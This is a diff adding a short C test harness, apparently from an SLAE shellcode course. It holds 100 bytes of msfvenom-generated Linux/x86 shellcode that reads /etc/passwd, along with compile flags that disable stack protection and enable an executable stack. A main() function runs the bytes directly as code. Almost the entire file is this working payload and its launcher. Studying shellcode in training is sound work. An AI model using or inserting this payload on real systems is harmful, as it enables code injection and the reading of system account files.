@@ -1,0 +1,30 @@
+/*
+Tested on       : Linux/x86
+Author          : Elham AlShehri
+ID              : SLAE-1538
+Shellcode Size  : 100 bytes ( Null-free )
+Description     : linux/x86/read_file shellcode test ( PATH=/etc/passwd )
+
+Test Using:
+        gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
+*/
+#include<stdio.h>
+#include<string.h>
+
+// msfvenom -p linux/x86/read_file PATH=/etc/passwd -b "\x00" -f c -v shellcode
+unsigned char shellcode[] = 
+"\xdb\xc4\xbf\x9c\x7b\xa4\xb7\xd9\x74\x24\xf4\x5b\x29\xc9\xb1"
+"\x13\x31\x7b\x18\x03\x7b\x18\x83\xc3\x98\x99\x51\x5c\x96\xe5"
+"\x9f\xa3\xd6\x15\xfb\x92\x1f\xd8\x7b\x5d\x5c\x5b\x78\x5e\x62"
+"\x9c\xf6\xb9\xeb\x65\xb2\x46\xfb\x95\xc3\x8b\x7b\x1c\x01\xab"
+"\x7f\x1f\x86\xcc\xc4\x1e\x86\xcc\x3a\xec\x06\x74\x3b\xee\x06"
+"\x85\x80\xee\x06\x85\xf6\x23\x86\x6d\x33\x44\x78\x92\x94\xde"
+"\xf3\x0e\xc5\x50\x9d\xa3\x6a\xe6\x39\x44";
+
+
+int main(int argc, char *argv[])
+{
+	printf("Shellcode Length:  %d\n", strlen(shellcode));
+	int (*ret)() = (int(*)())shellcode;
+	ret();
+}
